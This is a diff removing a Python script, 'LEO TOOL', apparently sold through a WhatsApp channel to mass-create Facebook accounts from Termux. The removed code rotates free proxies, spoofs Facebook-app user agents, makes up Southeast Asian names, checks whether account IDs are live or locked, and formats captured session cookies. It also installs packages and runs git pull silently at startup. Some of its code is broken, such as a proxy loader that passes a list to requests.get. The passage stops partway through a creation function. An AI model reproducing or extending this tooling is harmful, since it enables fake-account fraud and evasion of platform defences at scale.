@@ -1,1100 +1,147 @@
-# ------------------[ AUTO INSTALL ]-------------------#
-import os, sys, subprocess, time
-
-
-def auto_install():
-    pkgs = [
-        "requests",
-        "beautifulsoup4",
-        "faker",
-        "fake-email",
-        "fake-useragent",
-    ]
-    total = len(pkgs)
-    os.system("clear")
-    print("\033[1;34m─────────────────────────────────────────────────────\033[1;37m")
-    print("INSTALLING MODULES...")
-    print("\033[1;34m─────────────────────────────────────────────────────\033[1;32m")
-    for i, pkg in enumerate(pkgs, 1):
-        pct = int((i / total) * 100)
-        bar_len = 20
-        filled = int(bar_len * i / total)
-        bar = "█" * filled + "░" * (bar_len - filled)
-        sys.stdout.write(
-            f"\r\033[1;37m[{bar}] \033[1;33m{pct}%\033[1;32m - Installing {pkg}...    "
-        )
-        sys.stdout.flush()
-        subprocess.check_call(
-            [
-                sys.executable,
-                "-m",
-                "pip",
-                "install",
-                "--quiet",
-                pkg,
-                "--break-system-packages",
-            ],
-            stdout=subprocess.DEVNULL,
-            stderr=subprocess.DEVNULL,
-        )
-    sys.stdout.write(
-        "\r\033[1;32m[{0}] \033[1;37m100% - \033[1;32mAll modules installed!\033[0m\n".format(
-            "█" * bar_len
-        )
-    )
-    time.sleep(1)
-    os.system("clear")
-
-
-auto_install()
-
-# ------------------[ IMPORT ]-------------------#
-import re, json, string, hashlib, random, platform
-import requests
-import bs4
-import faker
-import fake_email
-from faker import Faker
-from bs4 import BeautifulSoup
-from bs4 import BeautifulSoup as parse
-from bs4 import BeautifulSoup as par
-
-
-# ------------------[ PROXY SERVER ]-------------------#
-def load_proxies():
-    proxy_url = [
-        "https://raw.githubusercontent.com/chandtricker/HTTP/main/http.txt",
-        "https://raw.githubusercontent.com/chandtricker/HTTP/main/http_proxies.txt",
-    ]
-    try:
-        response = requests.get(proxy_url)
-        if response.status_code == 200:
-            return [proxy.strip() for proxy in response.text.splitlines()]
-    except requests.exceptions.RequestException:
-        pass
-    return []
-
-
-proxies_list = load_proxies()
-
-
-def get_random_proxy():
-    if proxies_list:
-        return {"http": random.choice(proxies_list)}
-    return None
-
-
-proxies = get_random_proxy()
-# ------------------[ COLORS ]-------------------#
-gggg = "\033[8;102m"  # green new coverage prices
-rrrr = "\033[8;101m"  # silver new cover words
-rrrrrrrr = "\033[32;101m"  # yes you are right
-q = "\033[1;30m"  # Gray
-w = "\033[1;31m"  # red
-e = "\033[1;32m"  # green
-r = "\033[1;33m"  # yellow
-t = "\033[1;34m"  # blue
-y = "\033[1;35m"  # rosy
-u = "\033[1;36m"  # Open blue
-i = "\033[1;37m"  # white
-P = "\x1b[1;97m"  #
-M = "\033[1;33m"  #
-H = "\033[1;32m"  #
-K = "\x1b[1;97m"  #
-B = "\x1b[1;96m"  #
-U = "\x1b[1;95m"  #
-O = "\x1b[1;97m"  #
-R = "\x1b[38;5;246m"  #
-N = "\x1b[0m"  #
-my_color = [P, M, H, K, B, U, O, N, R]
-ssn = requests.Session()
-boos = random.choice([P, M, H, K, B, U, O, N, R])
-orange = "\x1b[38;5;196m"
-yellow = "\x1b[38;5;208m"
-black = "\033[1;30m"
-red = "\x1b[38;5;160m"
-green = "\x1b[38;5;46m"
-yelloww = "\033[1;33m"
-blue = "\033[38;5;6m"
-purple = "\033[1;35m"
-cyan = "\033[1;36m"
-white = "\033[1;37m"
-faltu = "\033[1;47m"
-pvt = "\033[1;0m"
-gren = "\x1b[38;5;154m"
-gas = "\033[1;32m"
-abir = random.choice(
-    [
-        "\x1b[38;5;196m",
-        "\x1b[38;5;208m",
-        "\033[1;30m",
-        "\x1b[38;5;160m",
-        "\x1b[38;5;46m",
-        "\033[1;33m",
-        "\033[38;5;6m",
-        "\033[1;35m",
-        "\033[1;36m",
-        "\033[1;37m",
-    ]
-)
-my_color = [white, blue, green]
-warna = random.choice(my_color)
-# ------------------[ USER AGENT UA ]-------------------#
-from fake_useragent import UserAgent
-
-ua = UserAgent()
-
-
-def generate_user_agent():
-    android_versions = ["9", "10", "11", "12", "13"]
-    devices = [
-        "Infinix X682C",
-        "Redmi Note 9 Pro",
-        "V2111 Build/SP1A.210812.003",
-        "HLK-AL00 Build/HONORHLK-AL00",
-        "ASUS_Z01QD",
-        "Redmi 4A Build/MMB29M",
-    ]
-    browser_engines = [
-        "AppleWebKit/537.36 (KHTML, like Gecko) Chrome/",
-        "AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/9.2 Chrome/",
-    ]
-    browsers = ["Mobile Safari/537.36", "UCBrowser/11.4.8.1012 Mobile Safari/537.36"]
-    aa = "Mozilla/5.0 (Linux; Android"
-    b = random.choice(android_versions)
-    c = random.choice(devices)
-    d = random.choice("ABCDEFGHIJKLMNOPQRSTUVWXYZ")
-    e = random.randint(1, 999)
-    f = random.choice("ABCDEFGHIJKLMNOPQRSTUVWXYZ")
-    g = random.choice(browser_engines)
-    h = random.randint(80, 114)
-    i = "0"
-    j = random.randint(4200, 5900)
-    k = random.randint(40, 150)
-    l = random.choice(browsers)
-    return f"{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}"
-
-
-def W_ueragent():
-    chrome_versions = [(80, 3987, 163), (90, 4430, 212), (100, 4896, 127)]
-    webkit_versions = [(537, 36), (537, 36), (537, 36)]
-    safari_versions = [500, 600]
-    windows_versions = [(10, 0), (10, 1), (11, 0)]
-    chrome_version = random.choice(chrome_versions)
-    webkit_version = random.choice(webkit_versions)
-    safari_version = random.choice(safari_versions)
-    windows_version = random.choice(windows_versions)
-    is_win64 = random.choice([True, False])
-    win64_str = "Win64; x64" if is_win64 else "WOW64"
-    user_agent = (
-        f"Mozilla/5.0 (Windows NT {windows_version[0]}.{windows_version[1]}; {win64_str}) "
-        f"AppleWebKit/{webkit_version[0]}.{webkit_version[1]} (KHTML, like Gecko) "
-        f"Chrome/{chrome_version[0]}.{chrome_version[1]}.{chrome_version[2]} Safari/{safari_version}"
-    )
-    return user_agent
-
-
-def user_agent():
-    devices = [
-        "[FBAN/FB4A;FBAV/323.0.0.46.119;FBBV/298672707;FBDM/{density=2.75,width=1080,height=2168};FBLC/ru_RU;FBRV/299927973;FBCR/MTS RUS;FBMF/Xiaomi;FBBD/Redmi;FBDV/Redmi Note 9 Pro;FBSV/10]",
-        "[FBAN/FB4A;FBAV/316.0.0.54.116;FBBV/287519012;FBDM/{density=2.75,width=1080,height=2134};FBLC/cs_CZ;FBRV/289140577;FBCR/O2.CZ;FBMF/Xiaomi;FBBD/Redmi;FBDV/Redmi Note 8 Pro;FBSV/10]",
-        "[FBAN/FB4A;FBAV/305.1.0.40.120;FBBV/272401209;FBDM/{density=2.0,width=720,height=1456};FBLC/it_IT;FBRV/273474118;FBCR/I TIM;FBMF/OPPO;FBBD/OPPO;FBDV/CPH1931;FBSV/10]",
-        "[FBAN/FB4A;FBAV/435.0.0.42.112;FBBV/523162189;FBDM/{density=3.0,width=1080,height=2165};FBLC/it_IT;FBRV/526139383;FBCR/TIM;FBMF/OnePlus;FBBD/OnePlus;FBDV/LE2113;FBSV/13]",
-        "[FBAN/FB4A;FBAV/221.0.0.48.102;FBBV/154683427;FBDM/{density=2.75,width=1080,height=2030};FBLC/en_GB;FBRV/155327069;FBCR/Banglalink;FBMF/Xiaomi;FBBD/xiaomi;FBDV/Redmi Note 5;FBSV/8.1.0]",
-    ]
-    prefix = (
-        "[FBAN/FB4A;FBAV/"
-        + str(random.randint(11, 80))
-        + ".0.0."
-        + str(random.randint(9, 49))
-        + "."
-        + str(random.randint(11, 77))
-        + ";FBBV/"
-        + str(random.randint(11111111, 99999999))
-        + ";"
-    )
-    ua = prefix + random.choice(devices)
-    return ua
-
-
-# ------------------[ FAKE NAME PHILIPPINES ]-------------------#
-def fake_philippines():
-    first = Faker("en_PH").first_name()
-    last = Faker("en_PH").last_name()
-    return first, last
-
-
-# ------------------[ FAKE NAME INDONESIA ]-------------------#
-def fake_indonesia():
-    first = Faker("id_ID").first_name()
-    last = Faker("id_ID").last_name()
-    return first, last
-
-
-# ------------------[ FAKE NAME VIETNAMESE ]-------------------#
-def fake_vietnamese():
-    first = Faker("vi_VN").first_name()
-    last = Faker("vi_VN").last_name()
-    return first, last
-
-
-# ------------------[ DATA EXTRACTOR ]-------------------#
-def extractor(data):
-    try:
-        soup = BeautifulSoup(data, "html.parser")
-        data = {}
-        for inputs in soup.find_all("input"):
-            name = inputs.get("name")
-            value = inputs.get("value")
-            if name:
-                data[name] = value
-        return data
-    except Exception as e:
-        return {"error": str(e)}
-
-
-# ------------------[ LOCKED/ACTIVE CHECKER ]-------------------#
-def lock_checker(uid):
-    try:
-        response = requests.get(f"https://graph.facebook.com/{uid}/picture?type=normal")
-        if "Photoshop" in response.text:
-            return "Active"
-        else:
-            return "Locked"
-    except Exception as e:
-        pass
-        return "Error"
-
-
-# ------------------[ RANDOM STRING ]-------------------#
-def generate_random_string(length):
-    return "".join(random.choices(string.ascii_letters + string.digits, k=length))
-
-
-# Save to sdcard on Android
-folder_path = "/sdcard/AUTO_CREATE_LEO"
-if not os.path.exists("/sdcard/"):
-    folder_path = "AUTO_CREATE_LEO"
-try:
-    os.makedirs(folder_path, exist_ok=True)
-except:
-    pass
-# ------------------[ INFORMATION ]-------------------#
-try:
-    ___sim___ = (
-        subprocess.check_output("getprop gsm.operator.alpha", shell=True)
-        .decode("utf-8")
-        .replace("\n", "")
-        .replace(",", "|")
-    )
-except:
-    ___sim___ = "Unknown"
-
-try:
-    ___brand___ = (
-        subprocess.check_output("getprop ro.product.brand", shell=True)
-        .decode("utf-8")
-        .replace("\n", "")
-    )
-except:
-    ___brand___ = "Termux"
-
-___bit___ = platform.architecture()[0]
-
-try:
-    ___ccc___ = requests.get("http://ip-api.com/json/").json()["country"]
-except:
-    ___ccc___ = "Unknown"
-
-
-# ------------------[ ??? ]-------------------#
-def p(x):
-    print(x)
-
-
-# ------------------[ SLOW PRINT ]-------------------#
-def sp(text):
-    for char in text:
-        print(char, end="", flush=True)
-        time.sleep(0.01)
-
-
-# ------------------[ CONNECTION MONITOR ]-------------------#
-# ------------------[ WHATSAPP CHANNEL ]-------------------#
-WHATSAPP_CHANNEL = "https://whatsapp.com/channel/0029Vb8CSZQIt5rolffFX31P"
-
-
-# ------------------[ APPROVAL ALERT ]-------------------#
-def approval_alert():
-    os.system("clear")
-    for _ in range(3):
-        print("\033[1;32m")
-        print("  ╔═══════════════════════════════════════════╗")
-        print("  ║     ✅  A P P R O V E D  ✅              ║")
-        print("  ║     ✅  A P P R O V E D  ✅              ║")
-        print("  ║     ✅  A P P R O V E D  ✅              ║")
-        print("  ╚═══════════════════════════════════════════╝")
-        print("\033[1;33m")
-        print("  ╔═══════════════════════════════════════════╗")
-        print("  ║   🔥 CONGRATULATIONS! APPROVED! 🔥      ║")
-        print("  ║   🔥 CONGRATULATIONS! APPROVED! 🔥      ║")
-        print("  ║   🔥 CONGRATULATIONS! APPROVED! 🔥      ║")
-        print("  ╚═══════════════════════════════════════════╝")
-        time.sleep(0.5)
-        os.system("clear")
-        time.sleep(0.3)
-    print("\033[1;32m")
-    print("  ╔═══════════════════════════════════════════╗")
-    print("  ║     ✅  A P P R O V E D  ✅              ║")
-    print("  ║━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━║")
-    print("  ║  🔥 CONGRATULATIONS! APPROVED! 🔥       ║")
-    print("  ║━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━║")
-    print("  ║  ✅ Access Granted! Enjoy the Tool!     ║")
-    print("  ╚═══════════════════════════════════════════╝")
-    print("\033[1;37m")
-
-
-# ------------------[ APPROVAL SYSTEM ]-------------------#
-def approval():
-    os.system("clear")
-    print(logo2)
-    sp("\033[1;37m━▷ Welcome to LEO TOOL!")
-    time.sleep(2)
-
-    os.system("clear")
-    print(logo)
-
-    try:
-        os.system("git pull > /dev/null 2>&1")
-    except:
-        pass
-    time.sleep(1)
-
-    uuid = str(os.geteuid()) + "DS" + str(os.geteuid())
-    id = "MR-LEO-" + "".join(uuid)
-
-    sp("\033[1;39m━▷ You Get Approved for Using Command Paid Tool \033[1;37m")
-    print("\n\033[1;39m━▷ Your Key :\u001b[36m " + id)
-    time.sleep(0.1)
-    print(
-        """\033[1;30m◑\033[1;31m◑\033[1;32m◑\033[1;33m◑\033[1;34m◑\033[1;35m◑\033[1;36m◑\033[1;37m◑\033[1;30m◑\033[1;31m◑\033[1;32m◑\033[1;33m◑\033[1;34m◑\033[1;35m◑\033[1;36m◑\033[1;37m◑\033[1;30m◑\033[1;31m◑\033[1;32m◑\033[1;33m◑\033[1;34m◑\033[1;35m◑\033[1;36m◑\033[1;37m◑\033[1;30m◑\033[1;31m◑\033[1;32m◑\033[1;33m◑\033[1;34m◑\033[1;35m◑\033[1;36m◑\033[1;37m◑\033[1;30m◑\033[1;31m◑\033[1;32m◑\033[1;33m◑\033[1;34m◑\033[1;35m◑\033[1;36m◑\033[1;37m◑◑\033[1;33m◑\033[1;34m◑\033[1;35m◑"""
-    )
-
-    try:
-        github_urls = [
-            "https://raw.githubusercontent.com/Leoafrica/Leo-sys/refs/heads/main/key.txt",
-            "https://raw.githubusercontent.com/chandtricker/HTTP/refs/heads/main/http.txt",
-            "https://raw.githubusercontent.com/chandtricker/HTTP/main/http_proxies.txt",
-        ]
-
-        approved = False
-        while not approved:
-            any_ok = False
-            for url in github_urls:
-                try:
-                    response = requests.get(url, timeout=10)
-                    any_ok = True
-                    if response.status_code == 200 and id in response.text:
-                        approved = True
-                        break
-                except:
-                    continue
-            if not approved and not any_ok:
-                wait_conn()
-            elif not approved:
-                break
-
-        if approved:
-            sp("\n\033[1;39m━▷ Congrats! You are approved successfully. Enjoy the tool!")
-            approval_alert()
-            time.sleep(2)
-            return True
-        else:
-            sp("\n\033[1;39m━▷ Your Key is not approved. Please contact Admin")
-            print(f"\n\033[1;33m━▷ Your Generated Key: \033[1;36m{id}")
-            time.sleep(0.1)
-
-            print("\n\033[1;31m━▷ To get approval:")
-            print("\033[1;32m1. Open WhatsApp Channel")
-            print("\033[1;32m2. Send your key in channel response")
-            print("\033[1;32m3. Admin will approve within 24 hours")
-
-            choice = input(
-                '\n\033[1;33mPress ENTER to open channel or type "exit" to quit: '
-            )
-            if choice.lower() == "exit":
-                exit("\033[1;32m━▷ Thanks for trying CHAND TOOL!")
-
-            print(f"\033[1;32m━▷ Opening WhatsApp Channel...")
-            print(f"\033[1;36m")
-            print(f"════════════════════════════════════════════════════")
-            print(f"   {WHATSAPP_CHANNEL} ")
-            print(f"════════════════════════════════════════════════════")
-            print(f"\033[1;37m")
-
-            opened = False
-            try:
-                import webbrowser
-
-                if webbrowser.open(WHATSAPP_CHANNEL):
-                    opened = True
-            except:
-                pass
-            if not opened:
-                try:
-                    subprocess.run(
-                        ["termux-open-url", WHATSAPP_CHANNEL],
-                        check=True,
-                        timeout=5,
-                        capture_output=True,
-                    )
-                    opened = True
-                except:
-                    pass
-            if not opened:
-                try:
-                    subprocess.run(
-                        ["xdg-open", WHATSAPP_CHANNEL],
-                        check=True,
-                        timeout=5,
-                        capture_output=True,
-                    )
-                    opened = True
-                except:
-                    pass
-            if not opened:
-                try:
-                    subprocess.run(
-                        [
-                            "am",
-                            "start",
-                            "-a",
-                            "android.intent.action.VIEW",
-                            "-d",
-                            WHATSAPP_CHANNEL,
-                        ],
-                        check=True,
-                        timeout=5,
-                        capture_output=True,
-                    )
-                    opened = True
-                except:
-                    pass
-
-            if opened:
-                print(f"\033[1;32m━▷ ✅ WhatsApp Channel opening in browser!")
-            else:
-                print(
-                    f"\033[1;33m━▷ ⚠️  Auto-open failed. Tap the link above or open manually"
-                )
-
-            print(f"\033[1;32m━▷ Send this key in channel response: \033[1;36m{id}")
-
-            input("\n\033[1;33mAfter getting approval, press ENTER to check again...")
-            return approval()
-
-    except Exception as e:
-        print(f"\033[1;31m━▷ Error checking approval: {e}")
-        print("\033[1;31m━▷ Please check your internet connection")
-        choice = input('\n\033[1;33mPress ENTER to retry or type "exit" to quit: ')
-        if choice.lower() == "exit":
-            exit("\033[1;32m━▷ Thanks for trying LEO TOOL!")
-        return approval()
-
-
-# ------------------------[ VERSION ]-----------------------#
-____Version____ = "\033[1;32mV/1.1"
-# ------------------[ LOGO ]-------------------#
-logo = f"""\033[1;37mWELCOME TO LEO COMMAND
-
-\033[1;30m
-                  ▉▉▉▉
-                 ▂▉▉▉▉▂
-                \033[1;33m╰▏ ┛┗ ▕╯
-                 ╲ 👅 ╱
-                 \033[1;32m╱▔╲╱▔╲
-               ╱ ╱▏╭╮▕╲ ╲
-               ╲ ╲▏╭╮▕╱ ╱       \033[1;31m╷  ╭─╴╭─╮
-                \033[1;35m ╲▉▉▉▉╱         \033[1;34m│  ├╴ │ │
-                \033[1;34m  ▏╭╮▕          \033[1;32m╰─╴╰─╴╰─╯ 
-                \033[1;34m  ▏▏▕▕
-                  ▏▏▕▕
-                \033[1;31m ╭╰ ╮╭╰ ╮
-               \033[1;39mTHE \033[1;35mKING \033[1;36mLEO
-\033[0;95m●▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬●\033[1;37m๑۩♡۩๑\033[0;95m●▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬●
-\033[0;92m
-\033[1;31m██╗     ███████╗ ██████╗ 
-\033[1;32m██║     ██╔════╝██╔═══██╗
-\033[1;33m██║     █████╗  ██║   ██║
-\033[1;34m██║     ██╔══╝  ██║   ██║
-\033[1;35m███████╗███████╗╚██████╔╝
-\033[1;36m╚══════╝╚══════╝ ╚═════╝ 
-
-\033[0;95m●▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬●\033[1;37m๑۩♡۩๑\033[0;95m●▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬●
-\033[1;39m━▷ \033[0;91m𝙊𝙒𝙉𝙀𝙍    \033[1;39m◈✙◈\033[1;33m MR LEO 
-\033[1;39m━▷ \033[0;91m𝙎𝘼𝙏𝙐𝙏𝘼𝙎  \033[1;39m◈✙◈ \033[0;92mPAID
-\033[1;39m━▷ \033[0;91m𝙑𝙀𝙍𝙎𝙄𝙊𝙉  \033[1;39m◈✙◈ \033[1;37m1.0
-\033[1;39m━▷ \033[1;36mFEEL THE POWER OF LEO 
-\033[0;95m●▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬●\033[1;37m๑۩♡۩๑\033[0;95m●▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬●
-\033[1;39m━▷ LOCATION \033[1;39m◈✙◈ {___ccc___}
-\033[1;39m━▷ DEVICE   \033[1;39m◈✙◈ {___brand___}
-\033[1;39m━▷ BIT      \033[1;39m◈✙◈ {___bit___}
-\033[1;39m━▷ SIM SLOT \033[1;39m◈✙◈ {___sim___}
-\033[1;34m─────────────────────────────────────────────────────"""
-
-# ------------------[ LOGO2 ]-------------------#
-logo2 = """\033[1;30m◑\033[1;31m◑\033[1;32m◑\033[1;33m◑\033[1;34m◑\033[1;35m◑\033[1;36m◑\033[1;37m◑\033[1;30m◑\033[1;31m◑\033[1;32m◑\033[1;33m◑\033[1;34m◑\033[1;35m◑\033[1;36m◑\033[1;37m◑\033[1;30m◑\033[1;31m◑\033[1;32m◑\033[1;33m◑\033[1;34m◑\033[1;35m◑\033[1;36m◑\033[1;37m◑\033[1;30m◑\033[1;31m◑\033[1;32m◑\033[1;33m◑\033[1;34m◑\033[1;35m◑\033[1;36m◑\033[1;37m◑\033[1;30m◑\033[1;31m◑\033[1;32m◑\033[1;33m◑\033[1;34m◑\033[1;35m◑\033[1;36m◑\033[1;37m◑◑\033[1;33m◑\033[1;34m◑\033[1;35m◑
-\033[1;37mWELCOME TO LEO COMMAND
-
-\033[1;31m╦ ╦╔═╗╦  ╔═╗╔═╗╔╦╗╔═╗  
-║║║║╣ ║  ║  ║ ║║║║║╣   
-╚╩╝╚═╝╩═╝╚═╝╚═╝╩ ╩╚═╝  
-
-
-\033[1;32m╔╦╗╔═╗
- ║ ║ ║
- ╩ ╚═╝
-
-
-\033[1;33m╦  ╔═╗╔═╗
-║  ║╣ ║ ║
-╩═╝╚═╝╚═╝
-
-
-\033[1;35m╔╦╗╔═╗╔═╗╦  
- ║ ║ ║║ ║║  
- ╩ ╚═╝╚═╝╩═╝
-
- \033[1;31mOWNER \033[1;32mTOOL \033[1;33mOF \033[1;37mMR \033[1;35mLEO 
-
-\033[1;30m◑\033[1;31m◑\033[1;32m◑\033[1;33m◑\033[1;34m◑\033[1;35m◑\033[1;36m◑\033[1;37m◑\033[1;30m◑\033[1;31m◑\033[1;32m◑\033[1;33m◑\033[1;34m◑\033[1;35m◑\033[1;36m◑\033[1;37m◑\033[1;30m◑\033[1;31m◑\033[1;32m◑\033[1;33m◑\033[1;34m◑\033[1;35m◑\033[1;36m◑\033[1;37m◑\033[1;30m◑\033[1;31m◑\033[1;32m◑\033[1;33m◑\033[1;34m◑\033[1;35m◑\033[1;36m◑\033[1;37m◑\033[1;30m◑\033[1;31m◑\033[1;32m◑\033[1;33m◑\033[1;34m◑\033[1;35m◑\033[1;36m◑\033[1;37m◑◑\033[1;33m◑\033[1;34m◑\033[1;35m◑\033[1;30m◑\033[1;31m◑\033[1;32m◑\033[1;33m◑\033[1;34m◑\033[1;35m◑\033[1;36m◑\033[1;37m◑\033[1;30m◑\033[1;31m◑\033[1;32m◑\033[1;33m◑\033[1;34m◑\033[1;35m◑\033[1;36m◑\033[1;37m◑\033[1;30m◑\033[1;31m◑\033[1;32m◑\033[1;33m◑\033[1;34m◑\033[1;35m◑\033[1;36m◑\033[1;37m◑\033[1;30m◑\033[1;31m◑\033[1;32m◑\033[1;33m◑\033[1;34m◑\033[1;35m◑\033[1;36m◑\033[1;37m◑\033[1;30m◑\033[1;31m◑\033[1;32m◑\033[1;33m◑\033[1;34m◑\033[1;35m◑\033[1;36m◑\033[1;37m◑◑\033[1;33m◑\033[1;34m◑\033[1;35m◑\033[1;30m◑\033[1;31m◑\033[1;32m◑\033[1;33m◑\033[1;34m◑\033[1;35m◑\033[1;36m◑\033[1;37m◑\033[1;30m◑\033[1;31m◑\033[1;32m◑\033[1;33m◑\033[1;34m◑\033[1;35m◑\033[1;36m◑\033[1;37m◑\033[1;30m◑\033[1;31m◑\033[1;32m◑\033[1;33m◑\033[1;34m◑\033[1;35m◑\033[1;36m◑\033[1;37m◑\033[1;30m◑\033[1;31m◑\033[1;32m◑\033[1;33m◑\033[1;34m◑\033[1;35m◑\033[1;36m◑\033[1;37m◑\033[1;30m◑\033[1;31m◑\033[1;32m◑\033[1;33m◑\033[1;34m◑\033[1;35m◑\033[1;36m◑\033[1;37m◑◑\033[1;33m◑\033[1;34m◑\033[1;35m◑\033[1;30m◑\033[1;31m◑\033[1;32m◑\033[1;33m◑\033[1;34m◑\033[1;35m◑\033[1;36m◑\033[1;37m◑\033[1;30m◑\033[1;31m◑\033[1;32m◑\033[1;33m◑\033[1;34m◑\033[1;35m◑\033[1;36m◑\033[1;37m◑\033[1;30m◑\033[1;31m◑\033[1;32m◑\033[1;33m◑\033[1;34m◑\033[1;35m◑\033[1;36m◑\033[1;37m◑\033[1;30m◑\033[1;31m◑\033[1;32m◑\033[1;33m◑\033[1;34m◑\033[1;35m◑\033[1;36m◑\033[1;37m◑\033[1;30m◑\033[1;31m◑\033[1;32m◑\033[1;33m◑\033[1;34m◑\033[1;35m◑\033[1;36m◑\033[1;37m◑◑\033[1;33m◑\033[1;34m◑\033[1;35m◑"""
-
-
-# ------------------[ LINEX ]-------------------#
-def linex():
-    print(f"\033[1;34m─────────────────────────────────────────────────────")
-
-
-# ------------------[ SYSTEM CLEAR ]-------------------#
-def clear():
-    os.system("clear")
-    print(logo)
-
-
-# ------------------[ LOOP ]-------------------#
-loop = 0
-lim = 0
-tp = 0
-cnt = 0
-ok = []
-cp = []
-cps = 0
-oks = 0
-died = 0
-live = 0
-uid = []
-
-
-# ------------------[ MENU CHAND ]-------------------#
-# ------------------[ CONNECTION WAIT ]-------------------#
-def wait_conn():
-    while True:
-        for i in range(60, 0, -1):
-            sys.stdout.write(f"\r\033[1;31m━▷ Connection Lost! Retrying in {i}s... \033[0m")
-            sys.stdout.flush()
-            time.sleep(1)
-            try:
-                requests.get("https://www.google.com", timeout=2)
-                sys.stdout.write("\r\033[K\033[1;32m━▷ Connected! Resuming...\033[0m\n")
-                return
-            except:
-                continue
-
-# ------------------[ YOUTUBE CHANNEL ]-------------------#
-YOUTUBE_CHANNEL = "https://whatsapp.com/channel/0029Vb8CSZQIt5rolffFX31P"
-
-def open_url(url):
-    try:
-        import webbrowser
-        if webbrowser.open(url):
-            return True
-    except:
-        pass
-    try:
-        subprocess.run(["termux-open-url", url], check=True, timeout=5, capture_output=True)
-        return True
-    except:
-        pass
-    try:
-        subprocess.run(["xdg-open", url], check=True, timeout=5, capture_output=True)
-        return True
-    except:
-        pass
-    try:
-        subprocess.run(["am", "start", "-a", "android.intent.action.VIEW", "-d", url], check=True, timeout=5, capture_output=True)
-        return True
-    except:
-        pass
-    return False
-
-# ------------------[ UID CHECKER ]-------------------#
-UID_FOLDER = "ALIVE-UID-LEO"
-
-def uid_checker():
-    clear()
-    print(" \033[1;32m[\033[1;31m–\033[1;32m] UID CHECKER")
-    linex()
-    path = input(" \033[1;32m[\033[1;31m–\033[1;32m] ENTER TXT FILE PATH : ").strip()
-    if not path:
-        print(" \033[1;32m[\033[1;31m–\033[1;32m] \033[1;31mNO FILE SELECTED")
-        time.sleep(2)
-        menu()
-        return
-    try:
-        with open(path, "r") as f:
-            uids = [line.strip() for line in f if line.strip()]
-    except:
-        print(f" \033[1;32m[\033[1;31m–\033[1;32m] \033[1;31mFILE NOT FOUND: {path}")
-        time.sleep(2)
-        menu()
-        return
-    os.makedirs(UID_FOLDER, exist_ok=True)
-    live_path = os.path.join(UID_FOLDER, "LIVE-UID.txt")
-    death_path = os.path.join(UID_FOLDER, "DEATH-UID.txt")
-    live_count = 0
-    death_count = 0
-    total = len(uids)
-    print(f" \033[1;32m[\033[1;31m–\033[1;32m] TOTAL UIDS: \033[1;37m{total}")
-    linex()
-    for idx, uid in enumerate(uids, 1):
-        status = lock_checker(uid)
-        if status == "Active":
-            live_count += 1
-            sys.stdout.write(f"\r\033[1;32m[LIVE] {uid}                    \n")
-            sys.stdout.flush()
-            with open(live_path, "a") as f:
-                f.write(uid + "\n")
-        elif status == "Locked":
-            death_count += 1
-            sys.stdout.write(f"\r\033[1;31m[DEATH] {uid}                    \n")
-            sys.stdout.flush()
-            with open(death_path, "a") as f:
-                f.write(uid + "\n")
-        else:
-            sys.stdout.write(f"\r\033[1;33m[ERROR] {uid}                    \n")
-            sys.stdout.flush()
-    linex()
-    print(f" \033[1;32m[\033[1;31m–\033[1;32m] ✅ LIVE  : \033[1;32m{live_count}")
-    print(f" \033[1;32m[\033[1;31m–\033[1;32m] ❌ DEATH : \033[1;31m{death_count}")
-    print(f" \033[1;32m[\033[1;31m–\033[1;32m] \033[1;37mSAVED TO: {UID_FOLDER}/")
-    input("\n \033[1;33mPress ENTER to go back...")
-    menu()
-
-def menu():
-    clear()
-    print(" \033[1;32m[\033[1;31m1\033[1;32m] AUTO CREATE FB")
-    print(" \033[1;32m[\033[1;31m2\033[1;32m] UID CHECKER")
-    print(" \033[1;32m[\033[1;31m3\033[1;32m] SPREAD UID")
-    print(" \033[1;32m[\033[1;31m0\033[1;32m] EXIT ")
-    linex()
-    xd = input(" \033[1;32m[\033[1;31m–\033[1;32m] CHOOSE : ")
-    if xd in ["1", "01"]:
-        print("\033[1;32m━▷ Opening YouTube Channel...\033[1;36m")
-        print(f"  {YOUTUBE_CHANNEL}")
-        open_url(YOUTUBE_CHANNEL)
-        time.sleep(1)
-        method()
-    elif xd in ["2", "02"]:
-        print("\033[1;32m━▷ Opening WhatsApp Channel...\033[1;36m")
-        print("  https://whatsapp.com/channel/0029Vb8CSZQIt5rolffFX31P")
-        open_url("https://whatsapp.com/channel/0029Vb8CSZQIt5rolffFX31P")
-        time.sleep(1)
-        uid_checker()
-    elif xd in ["3", "03"]:
-        auto_create_fb_method_3_()
-    elif xd in ["0", "00"]:
-        exit(" \033[1;32m[\033[1;31m–\033[1;32m] THANKS FOR USE ♥ ")
-    else:
-        print(
-            " \033[1;32m[\033[1;31m–\033[1;32m] \033[1;31mOPTION NOT FOUND IN MENU..."
-        )
-        time.sleep(1)
-        menu()
-
-
-# ------------------[ AUTO CREATE FACEBOOK METHOD ]-------------------#
-def method():
-    clear()
-    print(" \033[1;32m[\033[1;31m1\033[1;32m] METHOD 1")
-    print(" \033[1;32m[\033[1;31m2\033[1;32m] METHOD 2")
-    linex()
-    xd = input(" \033[1;32m[\033[1;31m–\033[1;32m] CHOOSE : ")
-    if xd in ["1", "01"]:
-        auto_create_fb_method_1_()
-    elif xd in ["2", "02"]:
-        auto_create_fb_method_2_()
-
-
-# ------------------[ OKS AND CPS AND COOKIE ]-------------------#
-def cvt(st, ran):
-    try:
-        if st == "oks":
-            cookie = "c_user=%s;xs=%s;fr=%s;datr=%s;" % (
-                ran["c_user"],
-                ran["xs"],
-                ran["fr"],
-                ran["datr"],
-            )
-        elif st == "cps":
-            cookie = "checkpoint=%s;datr=%s;fr=%s;" % (
-                ran["checkpoint"],
-                ran["datr"],
-                ran["fr"],
-            )
-    except Exception as e:
-        cookie = "; ".join([str(x) + "=" + str(y) for x, y in ran])
-    return str(cookie)
-
-
-# ------------------[ METHOD 1 ]-------------------#
-def auto_create_fb_method_1_() -> None:
-    clear()
-    print(" \033[1;32m[\033[1;31m1\033[1;32m] NAME PHILIPPINE")
